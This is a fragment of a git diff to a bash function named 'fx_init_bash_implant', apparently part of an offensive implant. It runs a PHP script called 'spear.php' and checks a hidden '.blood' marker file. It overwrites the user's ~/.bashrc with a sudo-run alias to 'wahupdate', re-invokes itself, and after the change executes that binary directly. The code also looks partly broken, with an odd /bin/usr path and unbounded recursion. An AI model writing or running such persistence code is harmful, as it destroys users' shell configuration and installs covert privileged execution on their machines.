@@ -28,14 +28,14 @@ function fx_init_bash_implant(){
     php spear.php
 
 
-    
+
     #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
     if [ 0 == `cat .blood` ] #if no script is found
     then
         echo "alias 'wahupdate'='sudo /bin/usr/wahupdate'" > ~/.bashrc
         fx_init_bash_implant
     else
-        echo "wow meron";
+        wahupdate
     fi
 }
 
